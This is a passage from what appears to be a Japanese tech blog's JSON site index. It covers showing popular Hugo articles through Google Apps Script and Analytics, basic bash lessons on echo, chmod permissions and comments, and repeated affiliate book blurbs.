本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-01-12T12:30:57+09:00","image":"https://suzukiiichiro.github.io/posts/2022-01-12-01-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-01-12-01-suzuki/","title":"【はじめから】ざっくりわかるシェルスクリプト２"},{"content":"簡単にできるHugoで人気の記事を表示する方法の2回目になります。\n前回（簡単にできるHugoで人気の記事を表示する方法 #01）ではGAS（Google App Scripts）を使ってアナリティクスのデータをスプレッドシートに反映するところまで説明しました。\n今回は前回作成したスプレッドシートからデータを取得して、Hugoと連携するところまでやっていきましょう。\nスプレッドシートのデータをJSONで取得 Hugoやjsなどとの連携を簡単にするために、スプレッドシートのデータをjsonで取得できるようにします。\n前回作成したプログラムを開きます。\n開き方は前回の「簡単にできるHugoで人気の記事を表示する方法 #01」にある「スプレッドシートの設定」を確認してください。\nスプレッドシートのデータをjsonで取得するためには、APIを使用するケースもありますが、今回はAPIを使用しないで取得します。\nプログラムの内容は下記になります。\nスプレッドシートのIDはスプレッドシートのURL部分の\ndocs.google.com/spreadsheets/d/ スプレッドシートのID /edit#gid=0\nといったように docs.google.com/spreadsheets/d/ と edit に囲まれた部分になります。\nfunction getData(sheetName) { const sheet = SpreadsheetApp.openById(\u0026#34;スプレッドシートのID\u0026#34;).getSheetByName(sheetName); const rows = sheet.getDataRange().getValues(); const keys = rows.splice(0, 1)[0]; return rows.map(row =\u0026gt; { let obj = {}; row.map((item, index) =\u0026gt; obj[keys[index]] = item); return obj; }); } function doGet(e) { let data = getData(e.parameter.sheetname); return ContentService.createTextOutput(JSON.stringify(data, null, 2)).setMimeType(ContentService.MimeType.JSON); } プログラムの説明 doGetってなに？ doGet(e) はこのプログラムをURLから実行できるようにした際にパラメータの値を取得して処理を行う関数です。\nここでは getData()という関数に、クエリパラメータsheetnameを渡しております。\nURLにすると、https://〜/exec?sheetname=パラメータ\nとなります。\nこのパラメータ部分にスプレッドシートのシート名を渡すことで、該当するスプレッドシートのデータを表示できるようになるというわけです。\ngetDataでやってること getData(sheetName) では先程のクエリパラメータsheetnameの値を使って、シートから情報を取得してjsonに格納している部分です。\n指定したシートIDの値がある範囲からから値を取得するのが下記のプログラムです。\nconst rows = sheet.getDataRange().getValues(); その取得した値からタイトル、jsonのキーとなる部分を keys として格納します。\nそしたら先程取得した rows の値をループで取得しながらjson形式のデータに加工します。\nすると、\n[ [リンク, pv数, session数, users数], [リンク, pv数, session数, users数] ] というデータが\n[ {link: リンク, pv: pv数, session: session数, users: users数}, {link: リンク, pv: pv数, session: session数, users: users数} ] というjson形式に加工することができました。\nここまでを保存しておきます。\nこのプログラムを公開してURLでアクセスできるようにしましょう。\nGASのプログラムをデプロイして公開 それではここまでのファイルをデプロイして、Webでアクセスできるようにしましょう。\n右上にある「デプロイ」を押して、新しいデプロイをクリックします。\nすると、「新しいデプロイ」となるので、歯車のマーク「デプロイを有効にする」をおして、「ウェブアプリ」を選択します。\n設定の画面になるので、説明などを入力します。\n「次のユーザーとして実行」は自身のアドレスでかまいません。\n「アクセスできるよユーザー」部分は「 全員 」とします。\nこれによって、Hugoから呼び出した際に実行できるようになります。\nここまで設定できたら「デプロイ」を押して、プログラムを公開します。\n表示されたウェブアプリのURLが表示されるので、コピーしておきます。\n先程コピーしたURLの末尾に?sheetname=monthを追加してアクセスしてみましょう。\nhttps://script.google.com/macros/s/〜/exec?sheetname=month\nURLはこのような形になります。\n正常にアクセスできていれば\nとjson形式のデータが表示されるはずです。\nエラーが出た場合 TypeError: Cannot read property \u0026#39;getDataRange\u0026#39; of null（行 3、ファイル「コード」） というエラーが出た場合はパラメータが記述されていないだけなので、パラメータを記述することで正常に取得できます。\nそれ以外の場合は、「デバッグ」を使ってエラーを特定していく必要があります。\nデバッグではdoGetはクエリ取得できないので、e.parameter.sheetname部分を\u0026quot;month\u0026quot;と直書きしてデバッグを実行します。\nデプロイには注意 デプロイで「新しいデプロイ」を選択するとURLが変わる点に注意です。\nGASでウェブアプリのURLを固定するための方法は、「デプロイを管理」から更新をするようにします。\n「デプロイ」の「デプロイを管理」を押します。 そして、右にある鉛筆マークの「編集」を押します。\nすると、編集画面になり、バージョンや説明を修正することができます。 バージョン部分を「新しいバージョン」として、説明に「最新版」とでも打っておきましょう。 この状態で「デプロイ」をクリックします。 上記の作業で、URLを固定したままウェブアプリを公開することができます。\nHugoと連携して人気の記事を表示する アナリティクスとスプレッドシートを使って人気の記事をjsonで取得する事ができるようになったので、Hugoと連携します。\nHugoにはjsonを取得する機能がついているので、その機能を使ってデータを取得します。\n{{ $json := getJSON \u0026#34;https://script.google.com/macros/s/〜/exec?sheetname=month\u0026#34; }} \u0026lt;aside class=\u0026#34;widget archives sidearticle-contents--wrapper\u0026#34; id=\u0026#34;popular-articles--month\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;contents-area\u0026#34;\u0026gt; \u0026lt;header\u0026gt;\u0026lt;h2 class=\u0026#34;section-title\u0026#34;\u0026gt;人気の記事（1ヶ月以内）\u0026lt;/h2\u0026gt;\u0026lt;/header\u0026gt; \u0026lt;div class=\u0026#34;sidearticle-contents\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;flex article-list--tile\u0026#34;\u0026gt; {{ $page := .Site.Pages }} {{ range first .Site.Params.widgets.populerArticles.limit $json }} {{ $article := index (where $page \u0026#34;.RelPermalink\u0026#34; \u0026#34;eq\u0026#34; .link ) 0 }} {{ if $article }} \u0026lt;article\u0026gt; \u0026lt;h3 class=\u0026#34;article-title\u0026#34;\u0026gt;\u0026lt;a href=\u0026#34;{{ $article.RelPermalink }}\u0026#34;\u0026gt;{{- $article.Title -}}\u0026lt;/a\u0026gt;\u0026lt;/h3\u0026gt; \u0026lt;/article\u0026gt; {{ end }} {{ end }} \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/aside\u0026gt; getJSON のURLは先ほど作成したGASのウェブアプリURLになります。\n今回は月間の人気記事を取得したいので、?sheetname=monthとしてあります。\n年の場合はyear日の場合はdayなどとすることで必要な情報を取得できます。\n使用しているテンプレートにも夜と思いますが、layouts/partials/widget/popularArticlesMonth.html として保存しておきましょう。\nこのファイルをHugoで読み込むことで人気の記事を表示する事ができるようになります。\n取得する人気の記事件数はconfig.yamlなどのhugoの設定ファイル内のwidhetsにpopulerArticlesを追加して記述しておきます。\nwidgets: enabled: - popular-articles populerArticles: limit: 10 人気の記事を表示するプログラムの解説 まずはサイト全体の記事を取得しておきます。\n{{ $page := .Site.Pages }} 次に、取得したjsonのデータを設定で指定した範囲で取得します。\n{{ range first .Site.Params.widgets.populerArticles.limit $json }} ... {{ end }} 取得したデータからリンクに一致する記事を探します。\n配列のデータで検索されているので、indexを使って0番目の記事を取得しています。\nあとは通常の記事と同じように扱えます。\n{{ $article := index (where $page \u0026#34;.RelPermalink\u0026#34; \u0026#34;eq\u0026#34; .link ) 0 }} 今回は画像無しでタイトルのみの表示となりますが、データ自体は他の記事と同じなので画像やカテゴリ、本文などにもアクセス可能です。\n自動更新の設定 サイトに人気の記事を表示させることができました。\n今の設定だと人気の記事が更新されないので、GASの「トリガー」を使って定期的にアナリティクスのデータをjsonに反映するようにしておきます。\nfunction setMonth() { getGoogleAnalytics(\u0026#39;month\u0026#39;); } function setDay() { getGoogleAnalytics(\u0026#39;day\u0026#39;); } function setYear() { getGoogleAnalytics(\u0026#39;year\u0026#39;); } function all() { setDay(); setMonth(); setYear(); } 月だけでなく、日、年のデータも取得する夜にしておきます。\nそして、それらをすべて実行する関数「all」も追加しておきましょう。ここで保存しておきます。\nこれで準備ができました。\n左袖にあるストップウォッチアイコンを押して、「トリガー」を追加します。\n「トリガーを追加」を押して、「実行する関数」で実行したい関数を選びます。今回は月間のデータを取得したいので「setMonth」を選択します。 「実行するデプロイを選択」は「Head」のままで構いません。 「イベントのソースを選択」は「時間主導型」に変更して、時間で実行するようにしておきます。 「時間ベースのトリガーのタイプを選択」を更新したい頻度で選択します。月間のデータなので1日おきくらいに更新でもいいかもしれません。「日付ベースのタイマー」を選択します。\n一日おきではなく、毎時で更新したい場合は「時間ベースのタイマー」など各自にあったタイマーを選択してください。 「時刻を選択」で更新したい時間を選びます。とりあえず「午前4時〜5時」くらいに更新するようにしておきます。 「エラー通知設定」は各自で好きなタイミングで受信するようにしてください。私はいっぱい来ると嫌なので、「1週間おきに通知を受け取る」にしてあります。\n以上で設定が終わりました。下にある「保存」を押して保存します。\nこれで定期的にアナリティクスのデータがスプレッドシートに反映されるようになりました。\nまとめ Hugoで人気の記事を表示するには\nGoogleアナリティクスの連携 スプレッドシートを使ってjsonを作成 上記の2つを使うことで簡単に導入可能です。\nHugoを使って人気の記事を作成するにはサイトや投稿を公開した際になりますが、GitHub Actionsなどを使えばcron処理で定期的に再構築をかけることが可能なので、数十分おきに人気の記事を更新したり、スプレッドシートとgasのレン系の際にjsonを作成したので、javascriptでjsonを読み取って表示するといったことも可能です。\nソース 前回と今回で作成したソースになります。\nGASとスプレッドシートを使ってHugoに人気の記事を表示する function getData(sheetName) { const sheet = SpreadsheetApp.openById(\u0026#34;シートID\u0026#34;).getSheetByName(sheetName); const rows = sheet.getDataRange().getValues(); const keys = rows.splice(0, 1)[0]; return rows.map(row =\u0026gt; { let obj = {}; row.map((item, index) =\u0026gt; obj[keys[index]] = item); return obj; }); } function doGet(e) { let data = getData(e.parameter.sheetname); return ContentService.createTextOutput(JSON.stringify(data, null, 2)).setMimeType(ContentService.MimeType.JSON); } function getDate(type) { let calc = \u0026#39;d\u0026#39;; switch(type) { case \u0026#34;month\u0026#34;: calc = \u0026#39;M\u0026#39;; break; case \u0026#34;year\u0026#34;: calc = \u0026#39;y\u0026#39;; break; default: calc = \u0026#39;d\u0026#39;; break; } const d1 = dayjs.dayjs().locale(\u0026#39;ja\u0026#39;); return {start: d1.subtract(1, calc).format(\u0026#39;YYYY-MM-DD\u0026#39;), end: d1.format(\u0026#39;YYYY-MM-DD\u0026#39;)}; } function getGoogleAnalytics(name) { const id = \u0026#34;ga:ビューID\u0026#34;; const date = getDate(name); const response = AnalyticsReporting.Reports.batchGet({ reportRequests: [{ viewId: id, dateRanges: [{startDate:date.start,endDate: date.end}], samplingLevel: \u0026#39;LARGE\u0026#39;, metrics: [ {expression: \u0026#39;ga:pageviews\u0026#39;}, {expression: \u0026#39;ga:sessions\u0026#39;}, {expression: \u0026#39;ga:users\u0026#39;}, ], dimensions: [ {name: \u0026#39;ga:pagePath\u0026#39;} ], orderBys: [{ fieldName: \u0026#39;ga:pageviews\u0026#39;, sortOrder: \u0026#34;DESCENDING\u0026#34;, }], }] }); let rows = JSON.parse(response).reports[0].data.rows; rows = rows.filter(f =\u0026gt; /posts/.test(f.dimensions[0])).map(f =\u0026gt; { return f.dimensions.concat(f.metrics[0].values); }); let sheet = SpreadsheetApp.getActive().getSheetByName(name); sheet.clear(); rows.unshift([\u0026#34;link\u0026#34;, \u0026#34;pv\u0026#34;, \u0026#39;session\u0026#39;, \u0026#39;users\u0026#39;]); sheet.getRange(1, 1, rows.length, rows[0].length).setValues(rows); } function setMonth() { getGoogleAnalytics(\u0026#39;month\u0026#39;); } function setDay() { getGoogleAnalytics(\u0026#39;day\u0026#39;); } function setYear() { getGoogleAnalytics(\u0026#39;year\u0026#39;); } function all() { setDay(); setMonth(); setYear(); } Hugoで人気の記事を表示する \u0026lt;aside class=\u0026#34;widget archives sidearticle-contents--wrapper\u0026#34; id=\u0026#34;popular-articles--month\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;contents-area\u0026#34;\u0026gt; \u0026lt;header\u0026gt;\u0026lt;h2 class=\u0026#34;section-title\u0026#34;\u0026gt;人気の記事（1ヶ月以内）\u0026lt;/h2\u0026gt;\u0026lt;/header\u0026gt; \u0026lt;div class=\u0026#34;sidearticle-contents\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;flex article-list--tile\u0026#34;\u0026gt; {{ $page := .Site.Pages }} {{ range first .Site.Params.widgets.populerArticles.limit $json }} {{ $article := index (where $page \u0026#34;.RelPermalink\u0026#34; \u0026#34;eq\u0026#34; .link ) 0 }} {{ if $article }} \u0026lt;article\u0026gt; \u0026lt;h3 class=\u0026#34;article-title\u0026#34;\u0026gt;\u0026lt;a href=\u0026#34;{{ .context.RelPermalink }}\u0026#34;\u0026gt;{{- .context.Title -}}\u0026lt;/a\u0026gt;\u0026lt;/h3\u0026gt; \u0026lt;/article\u0026gt; {{ end }} {{ end }} \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/aside\u0026gt; 書籍の紹介 Googleアナリティクス プロフェッショナル　～分析・施策のアイデアを生む最強リファレンス ウェブ制作者から、マーケター、ウェブアナリストまで必携の1冊 「Googleアナリティクスはどこへ向かうのか?進化し続けるツールのポテンシャルを最大限に引き出したときに、新しい分析や施策のアイディアが生まれる」\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 Google Apps Script目的別リファレンス 実践サンプルコード付き Excelのマクロに似た「スクリプト」を書けば、Gmailや「スプレッドシート」などのGoogleサービスを更に効率的に、思うように使えます。そのスクリプトを書いて実行するプログラミング環境が、Google Apps Script(GAS)。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-01-07T11:54:15+09:00","image":"https://suzukiiichiro.github.io/posts/2022-01-07-01-wyoshi/analytics_hu3c7150185aea2714a4cee994a799664f_79251_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-01-07-01-wyoshi/","title":"GASとアナリティクスで、Hugoに人気記事を表示させる"},{"content":"Hello World はじめてのbashコマンド「echo」\nターミナルで非常に単純なbashステートメントを実行します。 コマンドの出力は「Hello, World」になります。\n$ echo \u0026#34;Hello, World\u0026#34; Hello, World $ はじめてのbashスクリプト「vim」\n$ vim HelloWorld.sh ＜空のvim HelloWorld.sh が開きます＞ vimで開いたHelloWorld.shを編集します。\n#!/bin/bash echo \u0026#34;Hello World\u0026#34;; はじめての実行権限「chmod」\nbashファイルは2つの方法で実行できます。\n１．bashコマンドを使用する方法、\n２．bashファイルに実行権限を設定し、ファイルを実行する方法\n一つ目の方法「bashコマンドを使用する」\n$ bash HelloWorld.sh もう一つの方法「chmodで実行権限を付与する」\n# +x で実行権限を付与 $ chmod +x HelloWorld.sh # ドット　スラッシュをつけて実行 $ ./HelloWorld.sh ヒント $ ./ でファイルを実行する場合、ソースファイルの先頭行に記載されている #!/bin/bash\nという記述をつかって実行されます。\n$ ./\u0026lt;ファイル名\u0026gt;\nで実行した場合は、bashコマンド（/bin/bash )を使って実行することを、ソースファイルの先頭で宣言している。という事になります。\nこのソースファイルの1行目の記述を「シェバン」と言います。 /usr/local/bin/awk\nにあるコマンドを使ってソースファイルを実行( ./\u0026lt;ファイル名\u0026gt;）したい場合は、ソースファイルの先頭行に\n#!/usr/local/bin/awk\nと、記述します。\nchmod の実行権限には +x で実行権限を付与する方法の他、0755 などの数字で付与する場合もあります。\nこれらをパーミッションと言います。\nヒント 考え方ですが、bashコマンドでファイルを実行する場合のメリットは、ファイルに実行権限をやみくもに与える必要がないことです。 同時に、第三者が簡単にファイルを実行できる事を防ぐ、自分自身が誤ってファイルを実行してしまうというケアレスミスを防ぐことができます。 実行権限を与える方法は、一般的ではありますが、注意も必要です。 パーミッションの確認\nターミナルのコマンドでカレントディレクトリ内のファイルやディレクトリの情報を確認します。\n$ls -l 上記のコマンドを実行すると、以下のような一覧が表示されるかと思います。\n-rw-r--r-- 1 user group 9 1月 1 00:00 hoge.txt drwxr-xr-x 6 user group 20480 1月 1 00:00 ダウンロード パーミッションの読み方\n「-rw-r\u0026ndash;r\u0026ndash;」や「drwxr-xr-x」の先頭の謎の10文字についてですが、\n最初の１文字目はファイル種別を表しています。\n-rw-r\u0026ndash;r\u0026ndash;\n種別意味 -ファイル dディレクトリ lシンボリックリンク 2文字目から4文字目はファイルの所有者に対する権限を表し、\n5文字目から7文字目はファイルの所有グループに対する権限を表し、\n8文字目から10文字目はその他に対する権限を表しています\n上記から-rw-r\u0026ndash;r\u0026ndash;は、\n「ファイル種別」が「ファイル」であり、\n「所有者」に「読み取り」と「書き込み」の権限があり、\n「所有グループ」に「読み取り」の権限があり、\n「その他」に「読み取り」の権限があることを示しています。\ndrwxr-xr-xは、\n「ファイル種別」が「ディレクトリ」であり、\n「所有者」に「読み取り」と「書き込み」と「実行」の権限があり、\n「所有グループ」に「読み取り」と「実行」の権限があり、\n「その他」に「読み取り」と「実行」の権限があることを示しています。\nアクセス権限の変更\nアクセス権限を変更する方法について記載します。\nパーミッションの変更には chmodコマンドを使用します。\n数値で指定する\n$ ls -l　-rw-r--r-- 1 user group 9 1月 1 00:00 hoge.txt $ chmod 764 hoge.txt $ ls -l -rwxrw-r-- 1 user group 9 1月 1 00:00 hoge.txt 上記のコマンドはhoge.txtに対してパーミッションの確認→変更→確認を行っています。\n$ chmod 764 hoge.txt に関して説明していきます。\nファイルのパーミッションの変更は以下の通りコマンドを実行すれば可能です。\nchmod モード 対象ファイル名 モードの数字について\nモード(数字)モード(アルファベット)権限 4r読み取り 2w書き込み 1x実行 上記の合計値を「所有者」「所有グループ」「その他」の順で入力することでパーミッションを変更することができます。 要するに上記の「764」は 「所有者」に対して「読み取り」「書き込み」「実行」を、 「所有グループ」に対して「読み取り」「書き込み」を、 「その他」に「読み取り」を付与しています。 ヒント 実行したい場合は $ chmod 755 \u0026lt;ファイル名\u0026gt; 読み取りのみを許可し、実行しない場合は $ chmod 644 \u0026lt;ファイル名\u0026gt; 自分だけの読み取りを許可する場合は $ chmod 600 \u0026lt;ファイル名\u0026gt; 通常は上記３種類しか使いません。 CGI などを使う場合は $ chown や $chgrp を組み合わせて使うことが多いです。 $ chmod 777 \u0026lt;ファイル名\u0026gt; というパーミッションを軽率に与えず、上手にコマンドを使いこなすことがセキュリティにつながります。 詳しくはこちら\nhttps://qiita.com/shisama/items/5f4c4fa768642aad9e06\n書籍の紹介 詳解 シェルスクリプト 大型本 – 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-01-07T10:03:12+09:00","image":"https://suzukiiichiro.github.io/posts/2022-01-14-01-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-01-14-01-suzuki/","title":"【１．Hello World】ざっくりわかる「シェルスクリプト」"},{"content":"echo コマンド echoコマンドの使用：\nさまざまなオプションでechoコマンドを使用できます。\n次の例では、いくつかの便利なオプションについて説明します。\nオプションなしで「echo」コマンドを使用すると、デフォルトで改行が追加されます。\n\u0026lsquo;-n\u0026rsquo;オプションは、改行なしでテキストを印刷するために使用され、\u0026rsquo;-e\u0026rsquo;オプションは、出力からバックスラッシュ文字を削除するために使用されます。\n\u0026rsquo;echo_example.sh\u0026rsquo;という名前の新しいbashファイルを作成し、次のスクリプトを追加します。\n#!/bin/bash echo \u0026#34;改行付きのテキストの印刷\u0026#34;; echo -n \u0026#34;改行なしのテキストの印刷\u0026#34;; echo -e \u0026#34;\\n削除\\tバックスラッシュ\\t文字\\n\u0026#34;; bashコマンドでファイルを実行します。\n$ bash echo_example.sh 改行付きのテキストの印刷 改行なしのテキストの印刷 削除\tバックスラッシュ\t文字 $ ヒント echo の利用例は果てしない。ここで説明してもだれも読みはしないだろう。なので、概要の抜粋を説明する echo でよく使われるオプションは以下の通り\nオプション\t意味\n-n\t最後の改行を出力しない -e\tエスケープシーケンスを解釈する -E\tエスケープシーケンスを解釈しない（デフォルト） エスケープシーケンスとは、上記のバックスラッシュのことだ。\n以下の4つを覚えておくだけでおおよそは事足りる。 オプション 意味\n\\r\tキャリッジリターン \\n\t改行（フォームフィード＋キャリッジリターン） \\t\t水平タブ \\\tバックスラッシュ 書籍の紹介 詳解 シェルスクリプト 大型本 – 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-01-07T10:03:12+09:00","image":"https://suzukiiichiro.github.io/posts/2022-01-14-02-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-01-14-02-suzuki/","title":"【２．echo コマンド】ざっくりわかる「シェルスクリプト」"},{"content":"コメント コメントの使用\n「#」記号は、bashスクリプトに1行コメントを追加するために使用されます。\n\u0026lsquo;comment_example.sh\u0026rsquo;という名前の新しいファイルを作成し、1行コメント付きの次のスクリプトを追加します。\n#!/bin/bash #2つの数値をsumに追加します ((sum=25+35)); #結果を出力します echo \u0026#34;$sum\u0026#34;; bashコマンドでファイルを実行します。\n$ bash comment_example.sh 60 $ ヒント 複数行コメントに関しては次の章で説明します。 書籍の紹介 詳解 シェルスクリプト 大型本 – 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! 